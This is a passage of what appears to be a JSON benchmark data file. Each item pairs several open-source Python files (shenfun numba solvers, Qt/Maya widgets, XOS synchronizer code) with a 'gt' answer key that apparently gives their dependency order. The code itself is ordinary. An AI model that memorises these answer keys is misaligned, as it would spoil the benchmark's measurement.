range(u.shape[0]):\n        for j in range(u.shape[1]):\n            for k in range(u.shape[2]):\n                if mask[i, j, k] == 0:\n                    u[i, j, k] = 0\n    return u\n\n@nb.jit(nopython=True, fastmath=True, cache=True)\ndef apply_mask_4D(u, mask):\n    for i in range(u.shape[0]):\n        for j in range(u.shape[1]):\n            for k in range(u.shape[2]):\n                for l in range(u.shape[3]):\n                    if mask[i, j, k, l] == 0:\n                        u[i, j, k, l] = 0\n    return u\n\n@nb.jit(nopython=True, fastmath=True, cache=True)\ndef apply_bmask_1D(u, mask):\n    for j in range(u.shape[1]):\n        if mask[j] == 0:\n            for i in range(u.shape[0]):\n                u[i, j] = 0\n    return u\n\n@nb.jit(nopython=True, fastmath=True, cache=True)\ndef apply_bmask_2D(u, mask):\n    for j in range(u.shape[1]):\n        for k in range(u.shape[2]):\n            if mask[j, k] == 0:\n                for i in range(u.shape[0]):\n                    u[i, j, k] = 0\n    return u\n\n@nb.jit(nopython=True, fastmath=True, cache=True)\ndef apply_bmask_3D(u, mask):\n    for j in range(u.shape[1]):\n        for k in range(u.shape[2]):\n            for l in range(u.shape[3]):\n                if mask[j, k, l] == 0:\n                    for i in range(u.shape[0]):\n                        u[i, j, k, l] = 0\n    return u\n\n@nb.jit(nopython=True, fastmath=True, cache=True)\ndef apply_bmask_4D(u, mask):\n    for j in range(u.shape[1]):\n        for k in range(u.shape[2]):\n            for l in range(u.shape[3]):\n                for m in range(u.shape[4]):\n                    if mask[j, k, l, m] == 0:\n                        for i in range(u.shape[0]):\n                            u[i, j, k, l, m] = 0\n    return u\n\n\n@nb.jit(nopython=False, fastmath=True, cache=True)\ndef apply_bxmask(u_hat, mask):\n    if mask is not None:\n        N = mask.shape\n        if len(N) == 1:\n            mask = np.broadcast_to(mask, u_hat.shape[-1])\n            for i in range(u_hat.shape[-1]):\n                if mask[i] == 0:\n                    u_hat[..., i] = 0\n        elif len(N) == 2:\n            mask = np.broadcast_to(mask, u_hat.shape[-2:])\n            for i in range(u_hat.shape[-2]):\n                for j in range(u_hat.shape[-1]):\n                    if mask[i, j] == 0:\n                        u_hat[..., i, j] = 0\n        elif len(N) == 3:\n            mask = np.broadcast_to(mask, u_hat.shape[-3:])\n            for i in range(u_hat.shape[-3]):\n                for j in range(u_hat.shape[-2]):\n                    for k in range(u_hat.shape[-1]):\n                        if mask[i, j, k] == 0:\n                            u_hat[..., i, j, k] = 0\n        elif len(N) == 4:\n            mask = np.broadcast_to(mask, u_hat.shape[-4:])\n            for i in range(u_hat.shape[-4]):\n                for j in range(u_hat.shape[-3]):\n                    for k in range(u_hat.shape[-2]):\n                        for l in range(u_hat.shape[-1]):\n                            if mask[i, j, k, l] == 0:\n                                u_hat[..., i, j, k, l] = 0\n        else:\n            u_hat *= mask\n    return u_hat\n\n'shenfun/shenfun/optimization/numba/diagma.py'\n:import numba as nb\nimport numpy as np\nfrom .la import Solve_axis_2D, Solve_axis_3D, Solve_axis_4D\n\n__all__ = ['DiagMA_inner_solve', 'DiagMA_Solve']\n\ndef DiagMA_Solve(x, data, axis=0):\n    n = x.ndim\n    if n == 1:\n        DiagMA_inner_solve(x, data)\n    elif n == 2:\n        Solve_axis_2D(data, x, DiagMA_inner_solve, axis)\n    elif n == 3:\n        Solve_axis_3D(data, x, DiagMA_inner_solve, axis)\n    elif n == 4:\n        Solve_axis_4D(data, x, DiagMA_inner_solve, axis)\n    else:\n        if axis > 0:\n            x = np.moveaxis(x, axis, 0)\n        DiagMA_inner_solve(x, data)\n        if axis > 0:\n            x = np.moveaxis(x, 0, axis)\n\n@nb.njit\ndef DiagMA_inner_solve(u, data):\n    d = data[0]\n    for i in range(d.shape[0]):\n        u[i] /= d[i]\n\n'shenfun/shenfun/optimization/numba/threedma.py'\n:import numba as nb\nimport numpy as np\nfrom .la import Solve_axis_2D, Solve_axis_3D, Solve_axis_4D\n\n__all__ = ['ThreeDMA_Solve', 'ThreeDMA_inner_solve']\n\ndef ThreeDMA_Solve(x, data, axis=0):\n    n = x.ndim\n    if n == 1:\n        ThreeDMA_inner_solve(x, data)\n    elif n == 2:\n        Solve_axis_2D(data, x, ThreeDMA_inner_solve, axis)\n    elif n == 3:\n        Solve_axis_3D(data, x, ThreeDMA_inner_solve, axis)\n    elif n == 4:\n        Solve_axis_4D(data, x, ThreeDMA_inner_solve, axis)\n    else:\n        if axis > 0:\n            x = np.moveaxis(x, axis, 0)\n        ThreeDMA_inner_solve(x, data)\n        if axis > 0:\n            x = np.moveaxis(x, 0, axis)\n\n@nb.jit(nopython=True, fastmath=True, cache=True)\ndef ThreeDMA_inner_solve(u, data):\n    d = data[0, :]\n    u1 = data[1, 2:]\n    u2 = data[1, 4:]\n    n = d.shape[0]\n    u[n-1] = u[n-1]/d[n-1]\n    u[n-2] = u[n-2]/d[n-2]\n    u[n-3] = (u[n-3]-u1[n-3]*u[n-1])/d[n-3]\n    u[n-4] = (u[n-4]-u1[n-4]*u[n-2])/d[n-4]\n    for i in range(n - 5, -1, -1):\n        u[i] = (u[i] - u1[i]*u[i+2] - u2[i]*u[i+4])/d[i]\n",
        "gt": [
            "'shenfun/shenfun/optimization/numba/threedma.py'",
            "'shenfun/shenfun/optimization/numba/__init__.py'",
            "'shenfun/shenfun/optimization/numba/diagma.py'"
        ]
    },
    {
        "files": [
            "'qt-learning/python/qtLearn/windows/assetBrowser/assetBrowserWindow.py'",
            "'qt-learning/python/qtLearn/widgets/nodesMayaWidget.py'",
            "'qt-learning/python/qtLearn/widgets/ui_nodesList.py'"
        ],
        "content": "'qt-learning/python/qtLearn/windows/assetBrowser/assetBrowserWindow.py'\n:\n\nimport sys\nfrom functools import partial\n\nimport Qt.QtWidgets as QtWidgets\n\nimport qtLearn.uiUtils as uiUtils\nimport qtLearn.widgets.nodesMayaWidget as nodesMayaWidget\nimport qtLearn.windows.assetBrowser.forms.ui_assetActions as ui_assetActions\nimport qtLearn.windows.assetBrowser.forms.ui_assetCart as ui_assetCart\nimport qtLearn.windows.assetBrowser.forms.ui_assetInfoView as ui_assetInfoView\nimport qtLearn.windows.assetBrowser.forms.ui_assetListView as ui_assetListView\nimport qtLearn.windows.assetBrowser.forms.ui_assetDependenciesView as ui_assetDependenciesView\nimport qtLearn.windows.assetBrowser.forms.ui_assetIncomingView as ui_assetIncomingView\nimport qtLearn.windows.assetBrowser.forms.ui_assetOutgoingView as ui_assetOutgoingView\nimport qtLearn.windows.assetBrowser.forms.ui_keyvalueView as ui_keyvalueView\nimport qtLearn.windows.assetBrowser.forms.ui_searchBar as ui_searchBar\nimport qtLearn.windows.assetBrowser.forms.ui_searchCustomField as ui_searchCustomField\nimport qtLearn.windows.assetBrowser.forms.ui_searchTagFinder as ui_searchTagFinder\nimport qtLearn.windows.assetBrowser.forms.ui_shotView as ui_shotView\nimport qtLearn.windows.assetBrowser.forms.ui_tagView as ui_tagView\nimport qtLearn.windows.assetBrowser.ui_assetBrowser as ui_assetBrowser\n\n\nclass AssetListView(QtWidgets.QWidget, ui_assetListView.Ui_Form):\n    def __init__(self):\n        super(AssetListView, self).__init__()\n        self.setupUi(self)\n\n\nclass SearchBar(QtWidgets.QWidget, ui_searchBar.Ui_Form):\n    def __init__(self):\n        super(SearchBar, self).__init__()\n        self.setupUi(self)\n\n\nclass SearchTagFinder(QtWidgets.QWidget, ui_searchTagFinder.Ui_Form):\n    def __init__(self):\n        super(SearchTagFinder, self).__init__()\n        self.setupUi(self)\n\n\nclass SearchCustomField(QtWidgets.QWidget, ui_searchCustomField.Ui_Form):\n    def __init__(self):\n        super(SearchCustomField, self).__init__()\n        self.setupUi(self)\n\n\nclass AssetActions(QtWidgets.QWidget, ui_assetActions.Ui_Form):\n    def __init__(self):\n        super(AssetActions, self).__init__()\n        self.setupUi(self)\n\n\n\n\nclass AssetCart(QtWidgets.QWidget, ui_assetCart.Ui_Form):\n    def __init__(self):\n        super(AssetCart, self).__init__()\n        self.setupUi(self)\n\n\nclass AssetInfoView(QtWidgets.QWidget, ui_assetInfoView.Ui_Form):\n    def __init__(self):\n        super(AssetInfoView, self).__init__()\n        self.setupUi(self)\n\n\nclass ShotView(QtWidgets.QWidget, ui_shotView.Ui_Form):\n    def __init__(self):\n        super(ShotView, self).__init__()\n        self.setupUi(self)\n\n\nclass AssetDependenciesView(QtWidgets.QWidget, ui_assetDependenciesView.Ui_Form):\n    def __init__(self):\n        super(AssetDependenciesView, self).__init__()\n        self.setupUi(self)\n\n\nclass AssetIncomingView(QtWidgets.QWidget, ui_assetIncomingView.Ui_Form):\n    def __init__(self):\n        super(AssetIncomingView, self).__init__()\n        self.setupUi(self)\n\n\nclass AssetOutgoingView(QtWidgets.QWidget, ui_assetOutgoingView.Ui_Form):\n    def __init__(self):\n        super(AssetOutgoingView, self).__init__()\n        self.setupUi(self)\n\n\nclass TagView(QtWidgets.QWidget, ui_tagView.Ui_Form):\n    def __init__(self):\n        super(TagView, self).__init__()\n        self.setupUi(self)\n\n\nclass KeyvalueView(QtWidgets.QWidget, ui_keyvalueView.Ui_Form):\n    def __init__(self):\n        super(KeyvalueView, self).__init__()\n        self.setupUi(self)\n\n\nclass AssetBrowserLayout(QtWidgets.QWidget,\n                         ui_assetBrowser.Ui_Form,\n                         uiUtils.QtInfoMixin):\n    def __init__(self, parent):\n        super(AssetBrowserLayout, self).__init__()\n        self.setupUi(self)\n\n        self.searchBarForm = SearchBar()\n        self.searchBarLayout.addWidget(self.searchBarForm)\n        if self.qtEqualOrAbove_4_7_X():\n            self.searchBarForm.searchText.setPlaceholderText(\"Search Text Here\")\n\n        self.searchCustomFrame.hide()\n        self.searchTagFinderForm = SearchTagFinder()\n\n        self.searchCustomLayout.addWidget(self.searchTagFinderForm)\n\n        self.searchCustomFieldForm = SearchCustomField()\n\n        self.searchCustomLayout.addWidget(self.searchCustomFieldForm)\n\n        self.assetListViewForm = AssetListView()\n\n        self.assetListViewForm.assetListWidget.hide()\n        self.assetListViewLayout.addWidget(self.assetListViewForm)\n\n        self.assetActionsForm = AssetActions()\n        self.assetActionsLayout.addWidget(self.assetActionsForm)\n\n        self.assetCartForm = AssetCart()\n        self.assetCartLayout.addWidget(self.assetCartForm)\n\n        self.assetInfoViewForm = AssetInfoView()\n        self.assetInfoViewLayout.addWidget(self.assetInfoViewForm)\n\n        self.shotViewForm = ShotView()\n        self.shotViewLayout.addWidget(self.shotViewForm)\n\n        self.assetDependenciesViewForm = AssetDependenciesView()\n        self.assetDependenciesViewLayout.addWidget(self.assetDependenciesViewForm)\n\n\n\n\n\n\n\n        self.tagViewForm = TagView()\n        self.tagViewLayout.addWidget(self.tagViewForm)\n\n        self.keyvalueViewForm = KeyvalueView()\n        self.keyvalueViewLayout.addWidget(self.keyvalueViewForm)\n\n\nbaseModule, BaseWindow = uiUtils.getBaseWindow()\n\n\nclass AssetBrowserWindow(BaseWindow):\n    def __init__(self, parent=None, name=None, title=None):\n        super(AssetBrowserWindow, self).__init__(parent, name=name)\n        self.setupUi(self)\n        self.addSubForm(AssetBrowserLayout)\n\n\n        if title is None:\n            title = 'Asset Browser'\n        self.setWindowTitle(title)\n\n\n        self.addMenuBarContents(self.menubar)\n        self.menubar.show()\n\n\n        self.baseHideProgressBar()\n        self.baseHideStandardButtons()\n\n    def addMenuBarContents(self, menubar):\n\n        search_menu = QtWidgets.QMenu('Search', menubar)\n\n\n        newSearchAction = QtWidgets.QAction('New Search', search_menu)\n        newSearchAction.setShortcut('Ctrl+N')\n        newSearchAction.setStatusTip('Start a new Asset search')\n        newSearchAction.triggered.connect(partial(self.newSearchCallback))\n\n\n        saveSearchAction = QtWidgets.QAction('Save Search', search_menu)\n        saveSearchAction.setShortcut('Ctrl+S')\n        saveSearchAction.setStatusTip('Save an Asset search')\n        saveSearchAction.triggered.connect(partial(self.saveSearchCallback))\n\n\n        search_mode_menu = QtWidgets.QMenu('Search Mode', search_menu)\n\n        modeBasicAction = QtWidgets.QAction('Basic', search_mode_menu)\n        modeBasicAction.setStatusTip('Use simple search text')\n        modeBasicAction.setCheckable(True)\n        modeBasicAction.setChecked(True)\n\n        modeTagAction = QtWidgets.QAction('Tag Finder', search_mode_menu)\n        modeTagAction.setStatusTip('Use tag browsing')\n        modeTagAction.setCheckable(True)\n        modeTagAction.setChecked(False)\n\n        modeFieldAction = QtWidgets.QAction('Search Condtions', search_mode_menu)\n        modeFieldAction.setStatusTip('Use custom Search condtions on database fields')\n        modeFieldAction.setCheckable(True)\n        modeFieldAction.setChecked(False)\n\n        searchModeActionGroup = QtWidgets.QActionGroup(search_menu)\n        searchModeActionGroup.addAction(modeBasicAction)\n        searchModeActionGroup.addAction(modeTagAction)\n        searchModeActionGroup.addAction(modeFieldAction)\n\n        search_mode_menu.addAction(modeBasicAction)\n        search_mode_menu.addAction(modeTagAction)\n        search_mode_menu.addAction(modeFieldAction)\n\n        search_menu.addAction(newSearchAction)\n        search_menu.addAction(saveSearchAction)\n        search_menu.addSeparator()\n        search_menu.addMenu(search_mode_menu)\n        menubar.addMenu(search_menu)\n\n\n        view_menu = QtWidgets.QMenu('View', menubar)\n\n        assetViewListAction = QtWidgets.QAction('List Asset View', view_menu)\n        assetViewListAction.setCheckable(True)\n        assetViewListAction.setChecked(True)\n        assetViewGridAction = QtWidgets.QAction('Grid Asset View', view_menu)\n        assetViewGridAction.setCheckable(True)\n\n        assetViewActionGroup = QtWidgets.QActionGroup(view_menu)\n        assetViewActionGroup.addAction(assetViewGridAction)\n        assetViewActionGroup.addAction(assetViewListAction)\n\n        view_menu.addAction(assetViewListAction)\n        view_menu.addAction(assetViewGridAction)\n        menubar.addMenu(view_menu)\n\n\n        version_menu = QtWidgets.QMenu('Versions', menubar)\n\n        approvedVersionAction = QtWidgets.QAction('Approved Versions', version_menu)\n        approvedVersionAction.setCheckable(True)\n        approvedVersionAction.setChecked(True)\n        latestVersionAction = QtWidgets.QAction('Latest Version', version_menu)\n        latestVersionAction.setCheckable(True)\n        deletedVersionAction = QtWidgets.QAction('Deleted Versions', version_menu)\n        deletedVersionAction.setCheckable(True)\n        customVersionAction = QtWidgets.QAction('Custom Versions', version_menu)\n        customVersionAction.setCheckable(True)\n\n        assetVersionActionGroup = QtWidgets.QActionGroup(version_menu)\n        assetVersionActionGroup.addAction(approvedVersionAction)\n        assetVersionActionGroup.addAction(latestVersionAction)\n        assetVersionActionGroup.addAction(deletedVersionAction)\n        assetVersionActionGroup.addAction(customVersionAction)\n\n        version_menu.addAction(approvedVersionAction)\n        version_menu.addAction(latestVersionAction)\n        version_menu.addAction(deletedVersionAction)\n        version_menu.addAction(customVersionAction)\n        menubar.addMenu(version_menu)\n\n\n        window_menu = QtWidgets.QMenu('Window', menubar)\n\n        assetCartAction = QtWidgets.QAction('Asset Cart', window_menu)\n        assetCartAction.setStatusTip('Show or hide the asset cart')\n        assetCartAction.setCheckable(True)\n        assetCartAction.setChecked(True)\n\n        assetInfoAction = QtWidgets.QAction('Asset Info', window_menu)\n        assetInfoAction.setStatusTip('Show or hide the asset info')\n        assetInfoAction.setCheckable(True)\n        assetInfoAction.setChecked(True)\n\n        window_menu.addAction(assetCartAction)\n        window_menu.addAction(assetInfoAction)\n        menubar.addMenu(window_menu)\n\n    def newSearchCallback(self):\n        print('new search callback')\n\n    def saveSearchCallback(self):\n        print('save search callback')\n\n\nui = None\n\n\ndef main(show=True, widthHeight=(1400, 600)):\n    global ui\n    print('ui:', ui)\n\n    name = 'AssetBrowserWindow'\n    app, parent = uiUtils.getParent()\n\n    if ui is not None:\n        ui.close()\n    ui = AssetBrowserWindow(parent=parent, name=name)\n    if not ui:\n        return ui\n    if show:\n        ui.show()\n\n    if widthHeight:\n        uiUtils.setWindowWidthHeight(ui, widthHeight)\n\n\n    if app is not None:\n        sys.exit(app.exec_())\n    return ui\n\n\n'qt-learning/python/qtLearn/widgets/nodesMayaWidget.py'\n:\n\nimport Qt\nimport Qt.QtCore as QtCore\nimport Qt.QtWidgets as QtWidgets\n\nimport qtLearn.widgets.ui_nodesList as ui_nodesList\n\n\n\nclass NodeListViewModel(QtCore.QAbstractListModel):\n    def __init__(self, nodeUUIDs=None, *args, **kwargs):\n        super(NodeListViewModel, self).__init__(*args, **kwargs)\n        if nodeUUIDs is None:\n            nodeUUIDs = []\n        self.__nodeUUIDs = nodeUUIDs\n        self.setNodeUUIDs(nodeUUIDs)\n\n    def getNodeUUIDs(self):\n        nodes = self.__nodeUUIDs\n        print('getNodeUUIDs:', nodes)\n        return nodes\n\n    def setNodeUUIDs(self, value):\n        print('setNodeUUIDs:', value)\n        self.__nodeUUIDs = value\n\n\n    def rowCount(self, parent):\n\n        nodes = self.getNodeUUIDs()\n\n        print('rowCount', len(nodes), nodes)\n        return len(nodes)\n\n    def data(self, index, role):\n        result = None\n\n\n        if role == Qt.DisplayRole:\n            row = index.row()\n            nodes = self.getNodeUUIDs()\n            node = nodes[row]\n\n            import maya.cmds\n            result = maya.cmds.ls(node, long=True) or []\n            result = str(result[0])\n            print('result', row, result)\n            return result\n\n    def headerData(self, section, orientation, role):\n        if role == Qt.DisplayRole:\n            if orientation == Qt.Horizontal:\n                return 'Palette'\n            else:\n                return 'Color'\n        pass\n\n\nclass NodesMayaWidget(QtWidgets.QWidget, ui_nodesList.Ui_Widget):\n    def __init__(self, *args, **kwargs):\n        super(NodesMayaWidget, self).__init__(*args, **kwargs)\n        self.setupUi(self)\n\n\n        self.getSelectionButton.clicked.connect(self.getNodes)\n        self.clearButton.clicked.connect(self.clearView)\n\n    def getNodes(self):\n        import maya.cmds\n        print('getNodes')\n        nodes = maya.cmds.ls(sl=True, uuid=True) or []\n        sep = ', '\n        text = '['\n        for node in nodes:\n            print('getNodes node:', node)\n            value = maya.cmds.ls(node, long=True) or []\n            text += str(value[0]) + sep\n        text = text.rpartition(sep)[0] + ']'\n\n        print('getNodes nodes:', self.listViewModel.getNodeUUIDs())\n\n\n\n\n        return text\n\n    def clearView(self):\n        print('clearView')\n        nodes = []\n\n\n        return\n\n    def getNodeStrings(self):\n\n        value = self.getNodes()\n        print('get string:', value)\n        return value\n\n'qt-learning/python/qtLearn/widgets/ui_nodesList.py'\n:\n\n\n\n\n\n\n\n\nfrom PyQt4 import QtCore, QtGui\n\nclass Ui_Widget(object):\n    def setupUi(self, Widget):\n        Widget.setObjectName(\"Widget\")\n        Widget.resize(418, 62)\n        sizePolicy = QtGui.QSizePolicy(QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)\n        sizePolicy.setHorizontalStretch(0)\n        sizePolicy.setVerticalStretch(0)\n        sizePolicy.setHeightForWidth(Widget.sizePolicy().hasHeightForWidth())\n        Widget.setSizePolicy(sizePolicy)\n        self.horizontalLayout = QtGui.QHBoxLayout(Widget)\n        self.horizontalLayout.setObjectName(\"horizontalLayout\")\n        self.lineEdit = QtGui.QLineEdit(Widget)\n        sizePolicy = QtGui.QSizePolicy(QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Fixed)\n        sizePolicy.setHorizontalStretch(0)\n        sizePolicy.setVerticalStretch(0)\n        sizePolicy.setHeightForWidth(self.lineEdit.sizePolicy().hasHeightForWidth())\n        self.lineEdit.setSizePolicy(sizePolicy)\n        self.lineEdit.setObjectName(\"lineEdit\")\n        self.horizontalLayout.addWidget(self.lineEdit)\n        self.buttonsVerticalLayout = QtGui.QVBoxLayout()\n        self.buttonsVerticalLayout.setObjectName(\"buttonsVerticalLayout\")\n        self.getSelectionButton = QtGui.QPushButton(Widget)\n        sizePolicy = QtGui.QSizePolicy(QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)\n        sizePolicy.setHorizontalStretch(0)\n        sizePolicy.setVerticalStretch(0)\n        sizePolicy.setHeightForWidth(self.getSelectionButton.sizePolicy().hasHeightForWidth())\n        self.getSelectionButton.setSizePolicy(sizePolicy)\n        self.getSelectionButton.setFlat(False)\n        self.getSelectionButton.setObjectName(\"getSelectionButton\")\n        self.buttonsVerticalLayout.addWidget(self.getSelectionButton)\n        self.clearButton = QtGui.QPushButton(Widget)\n        self.clearButton.setObjectName(\"clearButton\")\n        self.buttonsVerticalLayout.addWidget(self.clearButton)\n        self.horizontalLayout.addLayout(self.buttonsVerticalLayout)\n\n        self.retranslateUi(Widget)\n        QtCore.QMetaObject.connectSlotsByName(Widget)\n\n    def retranslateUi(self, Widget):\n        Widget.setWindowTitle(QtGui.QApplication.translate(\"Widget\", \"Form\", None, QtGui.QApplication.UnicodeUTF8))\n        self.getSelectionButton.setText(QtGui.QApplication.translate(\"Widget\", \"Get Sel\", None, QtGui.QApplication.UnicodeUTF8))\n        self.clearButton.setText(QtGui.QApplication.translate(\"Widget\", \"Clear\", None, QtGui.QApplication.UnicodeUTF8))\n\n",
        "gt": [
            "'qt-learning/python/qtLearn/widgets/ui_nodesList.py'",
            "'qt-learning/python/qtLearn/widgets/nodesMayaWidget.py'",
            "'qt-learning/python/qtLearn/windows/assetBrowser/assetBrowserWindow.py'"
        ]
    },
    {
        "files": [
            "'xos/lib/xos-synchronizer/xossynchronizer/backend.py'",
            "'xos/lib/xos-synchronizer/xossynchronizer/synchronizer.py'",
            "'xos/testservice/xos/synchronizer/testservice-synchronizer.py'",
            "'xos/lib/xos-synchronizer/xossynchronizer/event_engine.py'",
            "'xos/lib/xos-synchronizer/xossynchronizer/__init__.py'"
        ],
        "content": "'xos/lib/xos-synchronizer/xossynchronizer/backend.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom __future__ import absolute_import, print_function\n\nimport imp\nimport inspect\nimport os\nimport sys\nimport threading\nimport time\n\nfrom multistructlog import create_logger\nfrom xosconfig import Config\nfrom xossynchronizer.event_engine import XOSEventEngine\nfrom xossynchronizer.event_loop import XOSObserver\nfrom xossynchronizer.model_policy_loop import XOSPolicyEngine\nfrom xossynchronizer.pull_step_engine import XOSPullStepEngine\n\nlog = create_logger(Config().get(\"logging\"))\n\n\nclass Backend:\n    def __init__(self, model_accessor, log=log):\n        self.model_accessor = model_accessor\n        self.log = log\n\n    def load_sync_step_modules(self, step_dir):\n        sync_steps = []\n\n        self.log.info(\"Loading sync steps\", step_dir=step_dir)\n\n        for fn in os.listdir(step_dir):\n            pathname = os.path.join(step_dir, fn)\n            if (\n                os.path.isfile(pathname)\n                and fn.endswith(\".py\")\n                and (fn != \"__init__.py\")\n                and (not fn.startswith(\"test\"))\n            ):\n\n\n                sys_path_save = sys.path\n                sys.path.append(step_dir)\n                module = imp.load_source(fn[:-3], pathname)\n\n                self.log.debug(\"Loaded file: %s\", pathname)\n\n\n                sys.path = sys_path_save\n\n                for classname in dir(module):\n                    c = getattr(module, classname, None)\n\n\n\n\n\n\n\n\n                    if inspect.isclass(c):\n                        bases = inspect.getmro(c)\n                        base_names = [b.__name__ for b in bases]\n                        if (\n                            (\"SyncStep\" in base_names)\n                            and (hasattr(c, \"provides\") or hasattr(c, \"observes\"))\n                            and (c not in sync_steps)\n                        ):\n                            sync_steps.append(c)\n\n        self.log.info(\"Loaded sync steps\", steps=sync_steps)\n\n        return sync_steps\n\n    def run(self):\n        observer_thread = None\n        model_policy_thread = None\n        event_engine = None\n\n        steps_dir = Config.get(\"steps_dir\")\n        if steps_dir:\n            sync_steps = []\n\n\n            if steps_dir:\n                sync_steps = self.load_sync_step_modules(steps_dir)\n\n\n            if len(sync_steps) > 0:\n\n                self.log.info(\n                    \"Starting XOSObserver\",\n                    sync_steps=sync_steps,\n                    model_accessor=self.model_accessor,\n                )\n                observer = XOSObserver(sync_steps, self.model_accessor, self.log)\n                observer_thread = threading.Thread(\n                    target=observer.run, name=\"synchronizer\"\n                )\n                observer_thread.start()\n\n        else:\n            self.log.info(\"Skipping observer thread due to no steps dir.\")\n\n        pull_steps_dir = Config.get(\"pull_steps_dir\")\n        if not pull_steps_dir:\n            self.log.info(\"Skipping pull step engine due to no pull_steps_dir dir.\")\n        elif Config.get(\"desired_state\") == \"unload\":\n            self.log.info(\"Skipping pull steps engine due to synchronizer unloading.\")\n        else:\n            self.log.info(\"Starting XOSPullStepEngine\", pull_steps_dir=pull_steps_dir)\n            pull_steps_engine = XOSPullStepEngine(model_accessor=self.model_accessor)\n            pull_steps_engine.load_pull_step_modules(pull_steps_dir)\n            pull_steps_thread = threading.Thread(\n                target=pull_steps_engine.start, name=\"pull_step_engine\"\n            )\n            pull_steps_thread.start()\n\n        event_steps_dir = Config.get(\"event_steps_dir\")\n        if not event_steps_dir:\n            self.log.info(\"Skipping event engine due to no event_steps dir.\")\n        elif Config.get(\"desired_state\") == \"unload\":\n            self.log.info(\"Skipping event engine due to synchronizer unloading.\")\n        else:\n            self.log.info(\"Starting XOSEventEngine\", event_steps_dir=event_steps_dir)\n            event_engine = XOSEventEngine(\n                model_accessor=self.model_accessor, log=self.log\n            )\n            event_engine.load_event_step_modules(event_steps_dir)\n            event_engine.start()\n\n\n        policies_dir = Config.get(\"model_policies_dir\")\n        if policies_dir:\n            policy_engine = XOSPolicyEngine(\n                policies_dir=policies_dir,\n                model_accessor=self.model_accessor,\n                log=self.log,\n            )\n            model_policy_thread = threading.Thread(\n                target=policy_engine.run, name=\"policy_engine\"\n            )\n            model_policy_thread.is_policy_thread = True\n            model_policy_thread.start()\n        else:\n            self.log.info(\n                \"Skipping model policies thread due to no model_policies dir.\"\n            )\n\n        if (not observer_thread) and (not model_policy_thread) and (not event_engine):\n            self.log.info(\n                \"No sync steps, no policies, and no event steps. Synchronizer exiting.\"\n            )\n\n            return\n\n        while True:\n            try:\n                time.sleep(1000)\n            except KeyboardInterrupt:\n                print(\"exiting due to keyboard interrupt\")\n\n                if observer_thread:\n                    observer_thread._Thread__stop()\n                if model_policy_thread:\n                    model_policy_thread._Thread__stop()\n                sys.exit(1)\n\n'xos/lib/xos-synchronizer/xossynchronizer/synchronizer.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom __future__ import absolute_import\n\nimport time\n\nfrom multistructlog import create_logger\nfrom xosconfig import Config\n\n\nclass Synchronizer(object):\n    def __init__(self):\n        self.log = create_logger(Config().get(\"logging\"))\n\n    def create_model_accessor(self):\n        from .modelaccessor import model_accessor\n\n        self.model_accessor = model_accessor\n\n    def wait_for_ready(self):\n        models_active = False\n        wait = False\n        while not models_active:\n            try:\n\n                _i = self.model_accessor.Site.objects.first()\n                models_active = True\n            except Exception as e:\n                self.log.info(\"Exception\", e=e)\n                self.log.info(\"Waiting for data model to come up before starting...\")\n                time.sleep(10)\n                wait = True\n\n        if wait:\n            time.sleep(\n                60\n            )\n\n    def run(self):\n        self.create_model_accessor()\n        self.wait_for_ready()\n\n\n\n\n\n        from .backend import Backend\n\n        log_closure = self.log.bind(synchronizer_name=Config().get(\"name\"))\n        backend = Backend(log=log_closure, model_accessor=self.model_accessor)\n        backend.run()\n\n'xos/testservice/xos/synchronizer/testservice-synchronizer.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom __future__ import absolute_import\n\nimport os\nfrom xossynchronizer import Synchronizer\nfrom xosconfig import Config\n\n\ndef main():\n    base_config_file = os.path.abspath(os.path.dirname(\n        os.path.realpath(__file__)) + '/config.yaml')\n    mounted_config_file = os.path.abspath(os.path.dirname(\n        os.path.realpath(__file__)) + '/mounted_config.yaml')\n\n    if os.path.isfile(mounted_config_file):\n        Config.init(base_config_file, 'synchronizer-config-schema.yaml',\n                    mounted_config_file)\n    else:\n        Config.init(base_config_file, 'synchronizer-config-schema.yaml')\n\n    Synchronizer().run()\n\n\nif __name__ == \"__main__\":\n    main()\n\n'xos/lib/xos-synchronizer/xossynchronizer/event_engine.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom __future__ import absolute_import\n\nimport imp\nimport inspect\nimport os\nimport threading\nimport time\n\nimport confluent_kafka\n\nfrom xosconfig import Config\n\n\nclass XOSKafkaMessage:\n    def __init__(self, consumer_msg):\n\n        self.topic = consumer_msg.topic()\n        self.key = consumer_msg.key()\n        self.value = consumer_msg.value()\n\n        self.timestamp = None\n        (ts_type, ts_val) = consumer_msg.timestamp()\n\n        if ts_type is not confluent_kafka.TIMESTAMP_NOT_AVAILABLE:\n            self.timestamp = ts_val\n\n\nclass XOSKafkaThread(threading.Thread):\n\n\n    def __init__(self, step, bootstrap_servers, model_accessor, log, *args, **kwargs):\n        super(XOSKafkaThread, self).__init__(*args, **kwargs)\n        self.consumer = None\n        self.step = step\n        self.bootstrap_servers = bootstrap_servers\n        self.model_accessor = model_accessor\n        self.log = log\n        self.daemon = True\n\n    def create_kafka_consumer(self):\n\n        consumer_config = {\n            \"group.id\": Config().get(\"name\"),\n            \"bootstrap.servers\": \",\".join(self.bootstrap_servers),\n            \"default.topic.config\": {\"auto.offset.reset\": \"smallest\"},\n        }\n\n        return confluent_kafka.Consumer(**consumer_config)\n\n    def run(self):\n        if (not self.step.topics) and (not self.step.pattern):\n            raise Exception(\n                \"Neither topics nor pattern is defined for step %s\" % self.step.__name__\n            )\n\n        if self.step.topics and self.step.pattern:\n            raise Exception(\n                \"Both topics and pattern are defined for step %s. Choose one.\"\n                % self.step.__name__\n            )\n\n        self.log.info(\n            \"Waiting for events\",\n            topic=self.step.topics,\n            pattern=self.step.pattern,\n            step=self.step.__name__,\n        )\n\n        while True:\n            try:\n\n                if self.consumer is None:\n                    self.consumer = self.create_kafka_consumer()\n\n                    if self.step.topics:\n                        self.consumer.subscribe(self.step.topics)\n\n                    elif self.step.pattern:\n                        self.consumer.subscribe(self.step.pattern)\n\n            except confluent_kafka.KafkaError._ALL_BROKERS_DOWN as e:\n                self.log.warning(\n                    \"No brokers available on %s, %s\" % (self.bootstrap_servers, e)\n                )\n                time.sleep(20)\n                continue\n\n            except confluent_kafka.KafkaError as e:\n\n    